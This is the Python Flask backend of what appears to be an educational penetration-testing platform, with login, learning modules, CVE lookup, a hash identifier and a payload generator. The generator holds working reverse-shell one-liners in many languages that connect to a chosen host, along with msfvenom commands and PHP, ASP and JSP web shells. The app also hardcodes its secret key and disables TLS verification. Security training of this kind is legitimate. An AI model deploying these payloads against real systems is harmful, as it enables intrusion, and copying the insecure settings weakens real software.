"""
🔥 PenTest Agent - Comprehensive Cybersecurity Platform
Enhanced with Online Features, CVE Lookup, Exploit Search, and more!
"""

from flask import Flask, render_template, jsonify, request, session, redirect, url_for, flash
import json
import os
import urllib.request
import urllib.parse
import ssl
from functools import wraps
import database
import learning_content

app = Flask(__name__)
app.config['SECRET_KEY'] = 'pentest-agent-secret-key-2024'

# Knowledge base directory
KB_DIR = os.path.join(os.path.dirname(__file__), 'knowledge_base')

# Create unverified SSL context for API calls
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

def load_all_services():
    """Load all service knowledge bases"""
    services = {}
    categories = {
        'services': [],
        'privesc': [],
        'shells': [],
        'wireless': [],
        'passwords': [],
        'web': []
    }
    
    if os.path.exists(KB_DIR):
        for filename in os.listdir(KB_DIR):
            if filename.endswith('.json'):
                service_name = filename.replace('.json', '')
                filepath = os.path.join(KB_DIR, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        services[service_name] = data
                except Exception as e:
                    print(f"Error loading {filename}: {e}")
    return services

def get_service(service_name):
    """Get a specific service's knowledge base"""
    filepath = os.path.join(KB_DIR, f'{service_name}.json')
    if os.path.exists(filepath):
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    return None

# Initialize database
database.init_db()

# Login required decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash('Please login to access this page', 'warning')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ==================== AUTHENTICATION ROUTES ====================

@app.route('/register', methods=['GET', 'POST'])
def register():
    """User registration"""
    if request.method == 'POST':
        data = request.get_json() if request.is_json else request.form
        username = data.get('username')
        email = data.get('email')
        password = data.get('password')
        full_name = data.get('full_name', '')
        
        if not all([username, email, password]):
            return jsonify({'success': False, 'error': 'All fields are required'}), 400
        
        result = database.create_user(username, email, password, full_name)
        
        if result['success']:
            return jsonify({'success': True, 'message': 'Registration successful! Please login.'})
        else:
            return jsonify(result), 400
    
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """User login"""
    if request.method == 'POST':
        data = request.get_json() if request.is_json else request.form
        username = data.get('username')
        password = data.get('password')
        
        if not all([username, password]):
            return jsonify({'success': False, 'error': 'Username and password required'}), 400
        
        user = database.verify_user(username, password)
        
        if user:
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['email'] = user['email']
            return jsonify({'success': True, 'redirect': url_for('dashboard')})
        else:
            return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """User logout"""
    session.clear()
    flash('You have been logged out successfully', 'success')
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    """Learning dashboard"""
    user = database.get_user_by_id(session['user_id'])
    progress = database.get_user_progress(session['user_id'])
    stats = database.get_user_stats(session['user_id'])
    modules = learning_content.get_all_modules()
    
    return render_template('dashboard.html', 
                         user=user, 
                         progress=progress, 
                         stats=stats,
                         modules=modules)

@app.route('/learn/<module_id>')
@login_required
def learn_module(module_id):
    """View specific learning module"""
    module = learning_content.get_module_by_id(module_id)
    if not module:
        flash('Module not found', 'error')
        return redirect(url_for('dashboard'))
    
    user_progress = database.get_user_progress(session['user_id'])
    return render_template('learn_module.html', module=module, progress=user_progress)

@app.route('/learn/<module_id>/<lesson_id>')
@login_required
def learn_lesson(module_id, lesson_id):
    """View specific lesson"""
    lesson = learning_content.get_lesson_by_id(module_id, lesson_id)
    if not lesson:
        flash('Lesson not found', 'error')
        return redirect(url_for('dashboard'))
    
    module = learning_content.get_module_by_id(module_id)
    return render_template('learn_lesson.html', module=module, lesson=lesson)

@app.route('/api/progress/update', methods=['POST'])
@login_required
def update_progress():
    """Update user's learning progress"""
    data = request.get_json()
    module_id = data.get('module_id')
    lesson_id = data.get('lesson_id')
    completed = data.get('completed', False)
    progress = data.get('progress', 0)
    
    result = database.update_user_progress(
        session['user_id'],
        module_id,
        lesson_id,
        completed,
        progress
    )
    
    return jsonify(result)

@app.route('/api/user/stats')
@login_required
def get_user_stats():
    """Get user statistics"""
    stats = database.get_user_stats(session['user_id'])
    achievements = database.get_user_achievements(session['user_id'])
    return jsonify({'stats': stats, 'achievements': achievements})

@app.route('/')
def index():
    """Main landing page"""
    return render_template('index.html')

@app.route('/academy')
def academy():
    """Academy - redirect to dashboard if logged in, login if not"""
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/tools')
@login_required
def tools():
    """Security tools reference"""
    return render_template('tools.html')

@app.route('/team')
def team():
    """Team page"""
    return render_template('team.html')

@app.route('/ctf-labs')
@login_required
def ctf_labs():
    """CTF Practice Labs"""
    return render_template('ctf_labs.html')

@app.route('/contact')
def contact():
    """Contact Us page"""
    return render_template('contact.html')

@app.route('/api/contact/submit', methods=['POST'])
def submit_contact():
    """Handle contact form submission"""
    data = request.get_json() if request.is_json else request.form
    name = data.get('name')
    email = data.get('email')
    subject = data.get('subject', '')
    message = data.get('message')
    
    if not all([name, email, message]):
        return jsonify({'success': False, 'error': 'Name, email, and message are required'}), 400
    
    result = database.save_contact_message(name, email, subject, message)
    
    if result['success']:
        return jsonify({'success': True, 'message': 'Thank you for contacting us! We will get back to you soon.'})
    else:
        return jsonify(result), 500


@app.route('/api/services')
def api_services():
    """Get all available services"""
    services = load_all_services()
    service_list = []
    for key, service in services.items():
        service_list.append({
            'id': key,
            'name': service.get('name', key),
            'port': service.get('port', 'N/A'),
            'description': service.get('description', ''),
            'icon': service.get('icon', '🔧'),
            'category': service.get('category', 'services'),
            'technique_count': len(service.get('techniques', []))
        })
    return jsonify(service_list)

@app.route('/api/service/<service_id>')
def api_service_detail(service_id):
    """Get detailed info about a specific service"""
    service = get_service(service_id)
    if service:
        return jsonify(service)
    return jsonify({'error': 'Service not found'}), 404

@app.route('/api/search')
def api_search():
    """Search across all techniques"""
    query = request.args.get('q', '').lower()
    if not query:
        return jsonify([])
    
    results = []
    services = load_all_services()
    
    for service_id, service in services.items():
        for technique in service.get('techniques', []):
            searchable = f"{technique.get('name', '')} {technique.get('description', '')}".lower()
            for cmd in technique.get('commands', []):
                searchable += f" {cmd.get('tool', '')} {cmd.get('command', '')} {cmd.get('description', '')}".lower()
            
            if query in searchable:
                results.append({
                    'service_id': service_id,
                    'service_name': service.get('name', ''),
                    'service_icon': service.get('icon', '🔧'),
                    'technique': technique
                })
    
    return jsonify(results[:20])  # Limit to 20 results

@app.route('/api/analyze', methods=['POST'])
def api_analyze():
    """Analyze scan results and suggest techniques"""
    data = request.get_json()
    scan_output = data.get('scan_output', '').lower()
    
    detected_services = []
    port_mapping = {
        '21': 'ftp', '22': 'ssh', '23': 'telnet', '25': 'smtp',
        '53': 'dns', '80': 'http', '443': 'http', '445': 'smb',
        '3306': 'mysql', '3389': 'rdp', '5432': 'postgres',
        '6379': 'redis', '27017': 'mongodb', '389': 'ldap',
        '161': 'snmp', '139': 'smb'
    }
    
    for port, service in port_mapping.items():
        if port in scan_output:
            service_data = get_service(service)
            if service_data and service not in [s['service_id'] for s in detected_services]:
                detected_services.append({
                    'port': port,
                    'service_id': service,
                    'service_data': service_data
                })
    
    return jsonify({
        'detected_services': detected_services,
        'total_techniques': sum(len(s['service_data'].get('techniques', [])) for s in detected_services)
    })

# ==================== ONLINE FEATURES ====================

@app.route('/api/cve/search')
def api_cve_search():
    """Search for CVEs using NVD API"""
    query = request.args.get('q', '')
    if not query:
        return jsonify({'error': 'Query required'}), 400
    
    try:
        # Use CVE API (NIST NVD)
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={urllib.parse.quote(query)}&resultsPerPage=10"
        
        req = urllib.request.Request(url, headers={'User-Agent': 'PenTestAgent/1.0'})
        with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
            data = json.loads(response.read().decode())
            
            cves = []
            for vuln in data.get('vulnerabilities', [])[:10]:
                cve = vuln.get('cve', {})
                cves.append({
                    'id': cve.get('id', ''),
                    'description': cve.get('descriptions', [{}])[0].get('value', '')[:300] + '...' if cve.get('descriptions') else '',
                    'published': cve.get('published', ''),
                    'severity': get_cvss_severity(cve),
                    'cvss': get_cvss_score(cve)
                })
            
            return jsonify({'cves': cves, 'total': data.get('totalResults', 0)})
    except Exception as e:
        return jsonify({'error': str(e), 'cves': []}), 500

def get_cvss_score(cve):
    """Extract CVSS score from CVE data"""
    metrics = cve.get('metrics', {})
    if 'cvssMetricV31' in metrics and metrics['cvssMetricV31']:
        return metrics['cvssMetricV31'][0].get('cvssData', {}).get('baseScore', 'N/A')
    if 'cvssMetricV30' in metrics and metrics['cvssMetricV30']:
        return metrics['cvssMetricV30'][0].get('cvssData', {}).get('baseScore', 'N/A')
    if 'cvssMetricV2' in metrics and metrics['cvssMetricV2']:
        return metrics['cvssMetricV2'][0].get('cvssData', {}).get('baseScore', 'N/A')
    return 'N/A'

def get_cvss_severity(cve):
    """Extract CVSS severity from CVE data"""
    metrics = cve.get('metrics', {})
    if 'cvssMetricV31' in metrics and metrics['cvssMetricV31']:
        return metrics['cvssMetricV31'][0].get('cvssData', {}).get('baseSeverity', 'Unknown')
    if 'cvssMetricV30' in metrics and metrics['cvssMetricV30']:
        return metrics['cvssMetricV30'][0].get('cvssData', {}).get('baseSeverity', 'Unknown')
    return 'Unknown'

@app.route('/api/exploit/search')
def api_exploit_search():
    """Search for exploits using Exploit-DB API proxy"""
    query = request.args.get('q', '')
    if not query:
        return jsonify({'error': 'Query required'}), 400
    
    try:
        # Use ExploitDB's search (simulated with local knowledge)
        exploits = search_local_exploits(query)
        return jsonify({'exploits': exploits})
    except Exception as e:
        return jsonify({'error': str(e), 'exploits': []}), 500

def search_local_exploits(query):
    """Search local exploit database"""
    # Common exploit database
    exploit_db = [
        {'id': 'EDB-49757', 'title': 'vsftpd 2.3.4 - Backdoor Command Execution', 'platform': 'Linux', 'type': 'Remote'},
        {'id': 'EDB-42315', 'title': 'EternalBlue (MS17-010) SMB Remote Code Execution', 'platform': 'Windows', 'type': 'Remote'},
        {'id': 'EDB-41154', 'title': 'Linux Kernel 4.4 - DirtyCow Privilege Escalation', 'platform': 'Linux', 'type': 'Local'},
        {'id': 'EDB-40839', 'title': 'Apache Struts 2 - REST Plugin XStream RCE', 'platform': 'Multiple', 'type': 'WebApps'},
        {'id': 'EDB-46635', 'title': 'BlueKeep RDP Remote Code Execution (CVE-2019-0708)', 'platform': 'Windows', 'type': 'Remote'},
        {'id': 'EDB-41570', 'title': 'MS08-067 - Windows Server Service NetPathCanonicalize Overflow', 'platform': 'Windows', 'type': 'Remote'},
        {'id': 'EDB-34900', 'title': 'Shellshock - GNU Bash Remote Code Execution', 'platform': 'Linux', 'type': 'Remote'},
        {'id': 'EDB-42966', 'title': 'Apache Tomcat - AJP Ghostcat File Read/RCE', 'platform': 'Multiple', 'type': 'WebApps'},
        {'id': 'EDB-45161', 'title': 'Drupalgeddon 2 - Remote Code Execution', 'platform': 'PHP', 'type': 'WebApps'},
        {'id': 'EDB-41773', 'title': 'Jenkins - Groovy Script RCE', 'platform': 'Multiple', 'type': 'WebApps'},
        {'id': 'EDB-47984', 'title': 'SMBGhost (CVE-2020-0796) SMBv3 RCE', 'platform': 'Windows', 'type': 'Remote'},
        {'id': 'EDB-50064', 'title': 'PrintNightmare (CVE-2021-1675) Windows Spooler RCE', 'platform': 'Windows', 'type': 'Local'},
        {'id': 'EDB-50098', 'title': 'Log4Shell (CVE-2021-44228) Java JNDI Injection RCE', 'platform': 'Multiple', 'type': 'Remote'},
        {'id': 'EDB-17382', 'title': 'ProFTPD 1.3.3c - Backdoor Command Execution', 'platform': 'Linux', 'type': 'Remote'},
        {'id': 'EDB-10167', 'title': 'UnrealIRCd 3.2.8.1 - Backdoor Command Execution', 'platform': 'Linux', 'type': 'Remote'},
    ]
    
    query_lower = query.lower()
    return [e for e in exploit_db if query_lower in e['title'].lower() or query_lower in e['platform'].lower()][:10]

@app.route('/api/hash/identify', methods=['POST'])
def api_hash_identify():
    """Identify hash type"""
    data = request.get_json()
    hash_value = data.get('hash', '').strip()
    
    if not hash_value:
        return jsonify({'error': 'Hash required'}), 400
    
    results = identify_hash(hash_value)
    return jsonify({'results': results})

def identify_hash(hash_string):
    """Identify possible hash types based on length and format"""
    hash_string = hash_string.strip()
    length = len(hash_string)
    
    possible_types = []
    
    # Common hash lengths
    hash_map = {
        32: [
            {'name': 'MD5', 'hashcat': 0, 'john': 'raw-md5'},
            {'name': 'NTLM', 'hashcat': 1000, 'john': 'nt'},
            {'name': 'MD4', 'hashcat': 900, 'john': 'raw-md4'},
        ],
        40: [
            {'name': 'SHA-1', 'hashcat': 100, 'john': 'raw-sha1'},
            {'name': 'MySQL5', 'hashcat': 300, 'john': 'mysql-sha1'},
        ],
        56: [
            {'name': 'SHA-224', 'hashcat': 1300, 'john': 'raw-sha224'},
        ],
        64: [
            {'name': 'SHA-256', 'hashcat': 1400, 'john': 'raw-sha256'},
            {'name': 'HMAC-SHA256', 'hashcat': 1450, 'john': 'hmac-sha256'},
        ],
        96: [
            {'name': 'SHA-384', 'hashcat': 10800, 'john': 'raw-sha384'},
        ],
        128: [
            {'name': 'SHA-512', 'hashcat': 1700, 'john': 'raw-sha512'},
            {'name': 'Whirlpool', 'hashcat': 6100, 'john': 'whirlpool'},
        ]
    }
    
    if length in hash_map:
        possible_types.extend(hash_map[length])
    
    # Specific patterns
    if hash_string.startswith('$2a$') or hash_string.startswith('$2b$') or hash_string.startswith('$2y$'):
        possible_types.insert(0, {'name': 'bcrypt', 'hashcat': 3200, 'john': 'bcrypt'})
    elif hash_string.startswith('$6$'):
        possible_types.insert(0, {'name': 'SHA-512 Crypt (Unix)', 'hashcat': 1800, 'john': 'sha512crypt'})
    elif hash_string.startswith('$5$'):
        possible_types.insert(0, {'name': 'SHA-256 Crypt (Unix)', 'hashcat': 7400, 'john': 'sha256crypt'})
    elif hash_string.startswith('$1$'):
        possible_types.insert(0, {'name': 'MD5 Crypt (Unix)', 'hashcat': 500, 'john': 'md5crypt'})
    elif hash_string.startswith('$apr1$'):
        possible_types.insert(0, {'name': 'Apache MD5', 'hashcat': 1600, 'john': 'md5apr1'})
    elif ':' in hash_string and len(hash_string.split(':')[0]) == 32:
        possible_types.insert(0, {'name': 'LM:NTLM', 'hashcat': 1000, 'john': 'lm'})
    
    return possible_types if possible_types else [{'name': 'Unknown hash type', 'hashcat': 'N/A', 'john': 'N/A'}]

@app.route('/api/payload/generate', methods=['POST'])
def api_payload_generate():
    """Generate common payloads"""
    data = request.get_json()
    payload_type = data.get('type', 'reverse_shell')
    lhost = data.get('lhost', '10.10.10.10')
    lport = data.get('lport', '4444')
    
    payloads = generate_payloads(payload_type, lhost, lport)
    return jsonify({'payloads': payloads})

def generate_payloads(payload_type, lhost, lport):
    """Generate various payload types"""
    payloads = []
    
    if payload_type == 'reverse_shell':
        payloads = [
            {'name': 'Bash', 'payload': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'},
            {'name': 'Python', 'payload': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"},
            {'name': 'PHP', 'payload': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"},
            {'name': 'Netcat (GNU)', 'payload': f'nc -e /bin/bash {lhost} {lport}'},
            {'name': 'Netcat (OpenBSD)', 'payload': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'},
            {'name': 'PowerShell', 'payload': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""},
            {'name': 'Perl', 'payload': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"},
            {'name': 'Ruby', 'payload': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"},
        ]
    elif payload_type == 'msfvenom':
        payloads = [
            {'name': 'Linux x64 Reverse TCP', 'payload': f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf'},
            {'name': 'Windows x64 Reverse TCP', 'payload': f'msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe'},
            {'name': 'Windows Meterpreter x64', 'payload': f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > meterpreter.exe'},
            {'name': 'PHP Reverse Shell', 'payload': f'msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw > shell.php'},
            {'name': 'JSP Reverse Shell', 'payload': f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.jsp'},
            {'name': 'WAR Reverse Shell', 'payload': f'msfvenom -p java/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > shell.war'},
            {'name': 'Python Reverse Shell', 'payload': f'msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={lport} -f raw'},
            {'name': 'ASP Meterpreter', 'payload': f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f asp > shell.asp'},
        ]
    elif payload_type == 'web_shell':
        payloads = [
            {'name': 'PHP System', 'payload': "<?php system($_GET['cmd']); ?>"},
            {'name': 'PHP Passthru', 'payload': "<?php passthru($_GET['cmd']); ?>"},
            {'name': 'PHP Exec', 'payload': "<?php echo exec($_GET['cmd']); ?>"},
            {'name': 'PHP Shell Exec', 'payload': "<?php echo shell_exec($_GET['cmd']); ?>"},
            {'name': 'PHP Backticks', 'payload': "<?php echo `$_GET['cmd']`; ?>"},
            {'name': 'ASP cmd', 'payload': '<%eval request("cmd")%>'},
            {'name': 'JSP cmd', 'payload': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'},
        ]
    
    return payloads

@app.route('/api/decode', methods=['POST'])
def api_decode():
    """Decode/encode various formats"""
    data = request.get_json()
    text = data.get('text', '')
    operation = data.get('operation', 'base64_decode')
    
    import base64
    import urllib.parse
    import html
    
    result = ''
    try:
        if operation == 'base64_decode':
            result = base64.b64decode(text).decode('utf-8', errors='ignore')
        elif operation == 'base64_encode':
            result = base64.b64encode(text.encode()).decode()
        elif operation == 'url_decode':
            result = urllib.parse.unquote(text)
        elif operation == 'url_encode':
            result = urllib.parse.quote(text)
        elif operation == 'html_decode':
            result = html.unescape(text)
        elif operation == 'html_encode':
            result = html.escape(text)
        elif operation == 'hex_decode':
            result = bytes.fromhex(text).decode('utf-8', errors='ignore')
        elif operation == 'hex_encode':
            result = text.encode().hex()
        else:
            result = 'Unknown operation'
    except Exception as e:
        result = f'Error: {str(e)}'
    
    return jsonify({'result': result})

@app.route('/api/stats')
def api_stats():
    """Get platform statistics"""
    services = load_all_services()
    total_techniques = sum(len(s.get('techniques', [])) for s in services.values())
    
    categories = {}
    for service in services.values():
        cat = service.get('category', 'services')
        if cat not in categories:
            categories[cat] = 0
        categories[cat] += 1
    
    return jsonify({
        'total_modules': len(services),
        'total_techniques': total_techniques,
        'categories': categories
    })

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🔥 Qylatrix - Comprehensive Cybersecurity Platform")
    print("="*70)
    
    # Get port from environment variable (for deployment) or use 5000 for local
    port = int(os.environ.get('PORT', 5000))
    debug_mode = os.environ.get('FLASK_ENV', 'development') == 'development'
    
    print(f"📍 Access the application at: http://localhost:{port}")
    print("")
    print("🌐 ONLINE FEATURES:")
    print("   • CVE Search (via NIST NVD)")
    print("   • Exploit Database Search")
    print("   • Hash Identifier")
    print("   • Payload Generator")
    print("   • Encoder/Decoder Tools")
    print("")
    print("📚 OFFLINE KNOWLEDGE BASE:")
    services = load_all_services()
    total_tech = sum(len(s.get('techniques', [])) for s in services.values())
    print(f"   • {len(services)} Modules Available")
    print(f"   • {total_tech} Exploitation Techniques")
    print("")
    print("⚠️  For educational and authorized testing only!")
    print("="*70 + "\n")
    
    app.run(debug=debug_mode, host='0.0.0.0', port=port)
